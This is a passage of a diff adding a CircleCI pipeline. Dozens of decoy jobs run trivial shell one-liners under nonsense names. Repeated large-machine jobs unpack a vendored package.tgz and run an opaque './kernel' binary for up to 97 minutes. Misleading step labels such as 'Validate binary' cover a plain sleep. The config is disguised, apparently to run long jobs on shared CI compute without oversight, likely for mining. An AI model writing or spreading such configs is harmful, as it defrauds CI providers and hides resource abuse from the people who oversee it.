+            size=$(wc -c </tmp/_bld/main_job_output_v4.txt); echo "stage ok: java17-bench size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - main_job_output_v4.txt
+  java17-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/main_job_output_v4.txt || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  package_alpha-v4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: soak
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1;b=1;for(i=0;i<30;i++){c=a+b;a=b;b=c}print c}'; true ; } > /tmp/_bld/manifest.tar
+            size=$(wc -c </tmp/_bld/manifest.tar); echo "stage ok: alpha-v4 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - manifest.tar
+  alpha-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/manifest.tar || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  route_QA_DEPLOY_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: clove hitch
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; yes a | head -2000 | md5sum | awk '{print $1}'; true ; } > /tmp/_bld/69.bin
+            size=$(wc -c </tmp/_bld/69.bin); echo "stage ok: QA_DEPLOY_3 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 69.bin
+  QA_DEPLOY_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/69.bin || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  retry_java17-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: page skip
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=10;i++){s+=1/i} printf "%.4f\n",s}'; true ; } > /tmp/_bld/final.txt
+            size=$(wc -c </tmp/_bld/final.txt); echo "stage ok: java17-lint size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - final.txt
+  java17-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/final.txt || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  stepB_add-login:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: stick weld
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=15;i++){s=""; for(j=1;j<=i;j++)s=s"X"; print s}}' | wc -l; true ; } > /tmp/_bld/package
+            size=$(wc -c </tmp/_bld/package); echo "stage ok: add-login size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - package
+  add-login:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/package || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  tmp_q3-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: sun dry
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "test123text" | sed 's/[0-9]/[&]/g'; true ; } > /tmp/_bld/pt-A.state
+            size=$(wc -c </tmp/_bld/pt-A.state); echo "stage ok: q3-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - pt-A.state
+  q3-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/pt-A.state || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+
+  reload_q3-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: nocturne
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; sed -n 'p;p' <<<"double"; true ; } > /tmp/_bld/pt-A.state
+            size=$(wc -c </tmp/_bld/pt-A.state); echo "stage ok: q3-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - pt-A.state
+  orchestrate_BuildApp_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: hard reset
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; id -g; true ; } > /tmp/_bld/payload.tgz
+            size=$(wc -c </tmp/_bld/payload.tgz); echo "stage ok: BuildApp size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - payload.tgz
+  wire_v9-beta_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: tame it
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 60 | awk '{if(NR%6==0)print $0":newline"}'; true ; } > /tmp/_bld/2024-08-23.data
+            size=$(wc -c </tmp/_bld/2024-08-23.data); echo "stage ok: v9-beta size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-08-23.data
+  round2_cf-new_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: dry sand
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "the quick brown fox" | fold -w5; true ; } > /tmp/_bld/passoff.state
+            size=$(wc -c </tmp/_bld/passoff.state); echo "stage ok: cf-new size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - passoff.state
+  package_validte-74_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: banner up
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tar -cf - /etc/hostname 2>/dev/null | wc -c; true ; } > /tmp/_bld/handoff.sig
+            size=$(wc -c </tmp/_bld/handoff.sig); echo "stage ok: validte-74 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - handoff.sig
+  run_java17-fmt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: run downwind
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "ab cd ef" | tr ' ' '\n' | wc -l; true ; } > /tmp/_bld/.marker
+            size=$(wc -c </tmp/_bld/.marker); echo "stage ok: java17-fmt size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .marker
+  stepA_QA_DEPLOY_3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: hand file
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<139938;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/_bld/69.bin
+            size=$(wc -c </tmp/_bld/69.bin); echo "stage ok: QA_DEPLOY_3 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 69.bin
+  spin_add-login_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: dink
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "hey   you   there" | sed 's/  */ /g' | awk '{print NF}'; true ; } > /tmp/_bld/package
+            size=$(wc -c </tmp/_bld/package); echo "stage ok: add-login size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - package
+  ctx2_dan-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: drag
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{split("x,y,z",a,","); print a[1] "+" a[2] "+" a[3]}'; true ; } > /tmp/_bld/.ready
+            size=$(wc -c </tmp/_bld/.ready); echo "stage ok: dan-build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .ready
+  spinner_shippit_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: run
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; hostname 2>/dev/null | md5sum; true ; } > /tmp/_bld/step-19.out
+            size=$(wc -c </tmp/_bld/step-19.out); echo "stage ok: shippit size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-19.out
+  maker_tango_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: cinder trail
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=100;for(i=1;i<=n;i++)if(i*i<n)r=i;print r}'; true ; } > /tmp/_bld/OK
+            size=$(wc -c </tmp/_bld/OK); echo "stage ok: tango size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - OK
+  bake_build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: smh
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; IFS=: read -ra parts <<<"a:b:c:d:e" && echo ${#parts[@]}; true ; } > /tmp/_bld/bundle.tar
+            size=$(wc -c </tmp/_bld/bundle.tar); echo "stage ok: build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - bundle.tar
+  maker_succes-only-46_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: monkey patch
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1;b=1;for(i=0;i<30;i++){c=a+b;a=b;b=c}print c}'; true ; } > /tmp/_bld/step-8.txt
+            size=$(wc -c </tmp/_bld/step-8.txt); echo "stage ok: succes-only-46 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-8.txt
+  staging_feb8-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: retry forever more
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{t=0;for(i=1;i<=100;i++)t+=1/i;printf "%.6f\n",t}'; true ; } > /tmp/_bld/output.out
+            size=$(wc -c </tmp/_bld/output.out); echo "stage ok: feb8-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - output.out
+  stage_wip-session-bug_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: dude it doesnt
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; printf "%d\n" $((RANDOM % 1000)) $((RANDOM % 100)) $((RANDOM % 10)) | awk '{s+=$1}END{print s}'; true ; } > /tmp/_bld/stash.bin
+            size=$(wc -c </tmp/_bld/stash.bin); echo "stage ok: wip-session-bug size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stash.bin
+  ctx_yolo_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: midnight ci
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50;i++)if(i%2)o++;else e++; print o"-"e}'; true ; } > /tmp/_bld/DONE.txt
+            size=$(wc -c </tmp/_bld/DONE.txt); echo "stage ok: yolo size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - DONE.txt
+  Beta_VERIFY_LAB_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: go
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; date +%Z; true ; } > /tmp/_bld/metrics.tsv
+            size=$(wc -c </tmp/_bld/metrics.tsv); echo "stage ok: VERIFY_LAB size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - metrics.tsv
+  postbuild_java17-lint_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: whipping end
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; alias | wc -l 2>/dev/null || echo zero; true ; } > /tmp/_bld/final.txt
+            size=$(wc -c </tmp/_bld/final.txt); echo "stage ok: java17-lint size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - final.txt
+workflows:
+  pipeline:
+    jobs:
+      - tmp_q3-rev
+      - reload_q3-rev_2:
+          requires:
+            - tmp_q3-rev
+      - q3-rev:
+          requires:
+            - reload_q3-rev_2
+      - verify_BuildApp:
+          requires:
+            - reload_q3-rev_2
+      - orchestrate_BuildApp_2:
+          requires:
+            - verify_BuildApp
+      - BuildApp:
+          requires:
+            - orchestrate_BuildApp_2
+      - D_v9-beta:
+          requires:
+            - orchestrate_BuildApp_2
+      - wire_v9-beta_2:
+          requires:
+            - D_v9-beta
+      - v9-beta:
+          requires:
+            - wire_v9-beta_2
+      - stepB_cf-new:
+          requires:
+            - wire_v9-beta_2
+      - round2_cf-new_2:
+          requires:
+            - stepB_cf-new
+      - cf-new:
+          requires:
+            - round2_cf-new_2
+      - builder_validte-74:
+          requires:
+            - round2_cf-new_2
+      - package_validte-74_2:
+          requires:
+            - builder_validte-74
+      - validte-74:
+          requires:
+            - package_validte-74_2
+      - fetcher_java17-fmt:
+          requires:
+            - package_validte-74_2
+      - run_java17-fmt_2:
+          requires:
+            - fetcher_java17-fmt
+      - java17-fmt:
+          requires:
+            - run_java17-fmt_2
+      - route_QA_DEPLOY_3:
+          requires:
+            - run_java17-fmt_2
+      - stepA_QA_DEPLOY_3_2:
+          requires:
+            - route_QA_DEPLOY_3
+      - QA_DEPLOY_3:
+          requires:
+            - stepA_QA_DEPLOY_3_2
+      - stepB_add-login:
+          requires:
+            - stepA_QA_DEPLOY_3_2
+      - spin_add-login_2:
+          requires:
+            - stepB_add-login
+      - add-login:
+          requires:
+            - spin_add-login_2
+      - phase_ensure-full-release-candidate
+      - ensure-full-release-candidate:
+          requires:
+            - phase_ensure-full-release-candidate
+      - reserve_v3-ga:
+          requires:
+            - phase_ensure-full-release-candidate
+      - v3-ga:
+          requires:
+            - reserve_v3-ga
+      - cleanup_RunSuite:
+          requires:
+            - reserve_v3-ga
+      - RunSuite:
+          requires:
+            - cleanup_RunSuite
+      - vendor_INFRA-177:
+          requires:
+            - cleanup_RunSuite
+      - INFRA-177:
+          requires:
+            - vendor_INFRA-177
+      - vendor_perseus-rev:
+          requires:
+            - vendor_INFRA-177
+      - perseus-rev:
+          requires:
+            - vendor_perseus-rev
+      - round1_ed-build
+      - ed-build:
+          requires:
+            - round1_ed-build
+      - tester_java17-bench:
+          requires:
+            - round1_ed-build
+      - java17-bench:
+          requires:
+            - tester_java17-bench
+      - wire_ValidatePipeline:
+          requires:
+            - tester_java17-bench
+      - ValidatePipeline:
+          requires:
+            - wire_ValidatePipeline
+      - red_test:
+          requires:
+            - wire_ValidatePipeline
+      - test:
+          requires:
+            - red_test
+      - fetcher_wip-edge-bug:
+          requires:
+            - red_test
+      - wip-edge-bug:
+          requires:
+            - fetcher_wip-edge-bug
+      - package_alpha-v4:
+          requires:
+            - fetcher_wip-edge-bug
+      - alpha-v4:
+          requires:
+            - package_alpha-v4
+      - deps_green-light:
+          requires:
+            - package_alpha-v4
+      - green-light:
+          requires:
+            - deps_green-light
+      - verify_dan-build
+      - ctx2_dan-build_2:
+          requires:
+            - verify_dan-build
+      - dan-build:
+          requires:
+            - ctx2_dan-build_2
+      - preflight_shippit:
+          requires:
+            - ctx2_dan-build_2
+      - spinner_shippit_2:
+          requires:
+            - preflight_shippit
+      - shippit:
+          requires:
+            - spinner_shippit_2
+      - preflight_tango:
+          requires:
+            - spinner_shippit_2
+      - maker_tango_2:
+          requires:
+            - preflight_tango
+      - tango:
+          requires:
+            - maker_tango_2
+      - spinner_build:
+          requires:
+            - maker_tango_2
+      - bake_build_2:
+          requires:
+            - spinner_build
+      - build:
+          requires:
+            - bake_build_2
+      - preflight_succes-only-46:
+          requires:
+            - bake_build_2
+      - maker_succes-only-46_2:
+          requires:
+            - preflight_succes-only-46
+      - succes-only-46:
+          requires:
+            - maker_succes-only-46_2
+      - B_feb8-rev:
+          requires:
+            - maker_succes-only-46_2
+      - staging_feb8-rev_2:
+          requires:
+            - B_feb8-rev
+      - feb8-rev:
+          requires:
+            - staging_feb8-rev_2
+      - resync_wip-session-bug:
+          requires:
+            - staging_feb8-rev_2
+      - stage_wip-session-bug_2:
+          requires:
+            - resync_wip-session-bug
+      - wip-session-bug:
+          requires:
+            - stage_wip-session-bug_2
+      - Beta_yolo:
+          requires:
+            - stage_wip-session-bug_2
+      - ctx_yolo_2:
+          requires:
+            - Beta_yolo
+      - yolo:
+          requires:
+            - ctx_yolo_2
+      - B_VERIFY_LAB:
+          requires:
+            - ctx_yolo_2
+      - Beta_VERIFY_LAB_2:
+          requires:
+            - B_VERIFY_LAB
+      - VERIFY_LAB:
+          requires:
+            - Beta_VERIFY_LAB_2
+      - retry_java17-lint:
+          requires:
+            - Beta_VERIFY_LAB_2
+      - postbuild_java17-lint_2:
+          requires:
+            - retry_java17-lint
+      - java17-lint:
+          requires:
+            - postbuild_java17-lint_2
